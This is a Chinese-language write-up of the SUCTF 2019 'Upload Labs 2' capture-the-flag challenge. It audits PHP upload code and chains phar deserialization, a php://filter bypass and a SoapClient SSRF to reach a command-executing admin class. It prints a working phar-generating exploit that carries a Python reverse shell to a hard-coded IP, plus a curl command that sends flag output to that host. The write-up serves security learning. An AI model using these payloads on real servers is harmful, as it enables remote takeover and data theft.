# \[SUCTF 2019]Upload Labs 2

## \[SUCTF 2019]Upload Labs 2

## 考点

* 代码审计
* phar反序列化
* PHP SoapClient 反序列化触发SSRF
* 使用phar://缺不能以phar开头时，可以使用`php://filter/resource=phar://`
* finfo\_file() 结合 php://filter 触发 phar 反序列化

## wp

有两个功能，上传图片和查看图片信息。

给了源码，和修改后的admin.php，要进行审计

index. php是文件上传功能，白名单限制。func.php是文件读取功能，返回文件的MIME。class.php定义了File类和Check类。至此基本判断是phar反序列化。

首先是index.php，说明了上传路径为 `upload/md5($_SERVER["REMOTE_ADDR"])`，然后采用白名单的方式限制后缀和content-type，最后调用Check类的check函数对上传文件内容做一个检查，不允许`<?`存在。对于func.php，是获取上传的文件，采用黑名单的方式封禁了很多PHP伪协议。然后调用自定义的File类来获取文件

然后找获取flag的地方，在admin.php的Ad类的`__destruct()`使用了system函数，也就是说要<mark style="background-color:orange;">对Ad类进行实例化，或者反序列化</mark>。

```php
class Ad{
    public $cmd;
    public $clazz;
    public $func1;
    public $func2;
    public $func3;
    public $instance;
    public $arg1;
    public $arg2;
    public $arg3;
    function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3){
        $this->cmd = $cmd;
        $this->clazz = $clazz;
        $this->func1 = $func1;
        $this->func2 = $func2;
        $this->func3 = $func3;
        $this->arg1 = $arg1;
        $this->arg2 = $arg2;
        $this->arg3 = $arg3;
    }
    function check(){
        $reflect = new ReflectionClass($this->clazz);
        $this->instance = $reflect->newInstanceArgs();
        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);
        $reflectionMethod->invoke($this->instance, $this->arg1);
        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);
        $reflectionMethod->invoke($this->instance, $this->arg2);
        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
        $reflectionMethod->invoke($this->instance, $this->arg3);
    }
    function __destruct(){
        system($this->cmd);
    }
```

接着看，在admin.php中如果是本地访问，并且POST参数admin，就可以实例化Ad类，并且Ad类的参数都可以用POST提交。

```php
if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
    if(isset($_POST['admin'])){
        $cmd = $_POST['cmd'];

        $clazz = $_POST['clazz'];
        $func1 = $_POST['func1'];
        $func2 = $_POST['func2'];
        $func3 = $_POST['func3'];
        $arg1 = $_POST['arg1'];
        $arg2 = $_POST['arg2'];
        $arg3 = $_POST['arg3'];
        $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);
        $admin->check();
    }
}
```

但是Ad类的`check()`函数的含义是什么？首先通过反射获取`$this->clazz`类，然后构造一个没有属性的`$this->clazz`类的实例化对象，最后分别获取`$this->clazz`类的`$this->func1`，`$this->func2`，`$this->func3`函数，并分别把`$this->arg1`，`$this->arg2`，`$this->arg3`传入执行。通过反射创建的类大概如下，这里类的方法和其参数都可以相同。

```php
Class clazz{
    function func1($arg1){
        ...
    }
    function func2($arg2){
        ...
    }
    function func3($arg3){
        ...
    }
}
```

这里可以使用<mark style="background-color:red;">SplStack类和它的push方法</mark>。POST数据

```
admin=1&cmd=curl "http://121.5.66.238:20010/?a=`/readflag`"&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3=123456
```

要想让 admin.php 去实例化Ad类，就要让 REMOTE\_ADDR 为 127.0.0.1，即本地访问，接下来的问题就是如何去实现SSRF

而在反序列化里面可以实现SSRF的是SoapClient类，接下来就要找触发SoapClient 的位置。<mark style="background-color:orange;">可以看到在 File 类中的 \_\_wakeup() 存在一个反射，那就可通过这个反射，来获取SoapClient对象，然后调用SoapClient对象的check函数，这个check函数SoapClien中并不存在，就可以触发SoapClient的SSRF</mark>

```php
class File{
    public $file_name;
    public $type;
    public $func = "Check";
    function __construct($file_name){
        $this->file_name = $file_name;
    }
    function __wakeup(){
        $class = new ReflectionClass($this->func);
        $a = $class->newInstanceArgs($this->file_name);
        $a->check();
    }
    function getMIME(){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $this->type = finfo_file($finfo, $this->file_name);
        finfo_close($finfo);
    }
    function __toString(){
        return $this->type;
    }
}
```

接下来就是如何让 File() 类反序列化。finfo\_file可以触发phar反序列化，但是在 fuc.php 不能传 phar:// 开头的字符串。<mark style="background-color:green;">在PHP中，php://filter/resource这个伪协议可以触发phar反序列化，所以在 fuc.php 不能传 phar:// 开头的字符串，可以使用 php://filter/resource=phar://......进行绕过</mark>

这里直接放反弹shell的exp

```php
<?php

class File{
	public $file_name;
	public $func="SoapClient";
	public function __construct(){
		$payload='admin=1&cmd=python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("121.5.66.238",20010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3=123456';
		$this->file_name=[null,array('location'=>'http://127.0.0.1/admin.php','user_agent'=>"xxx\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($payload)."\r\n\r\n".$payload,'uri'=>'abc')];
	}	
}
$a=new File();
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering(); 
$phar->setStub('GIF89a'.'<script language="php">__HALT_COMPILER();</script>');
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

使用上面的exp生成phar，改名为1.gif，再上传。在vps监听端口，在 fuc.php 中输入`php://filter/resource=phar://upload/cc551ab005b2e60fbdc88de809b2c4b1/b1467d0a5330091b554e2d892f7e8308.gif`，就可以反弹shell了

![](<../../.gitbook/assets/image (14) (1).png>)

![](<../../.gitbook/assets/image (34).png>)

或者是cmd改成``curl "http://121.5.66.238:20010/?a=`/readflag`"``直接获取flag

![](<../../.gitbook/assets/image (24).png>)

## 小结

1. 原题预期解是MySQL 客户端任意文件读取（MySQL Client Attack），改代码后简化了很多
2. [SUCTF 2019 Upload labs 2 踩坑记录](https://www.cnblogs.com/peri0d/p/12465523.html)
3. [https://www.cnblogs.com/tr1ple/p/11394464.html](https://www.cnblogs.com/tr1ple/p/11394464.html)
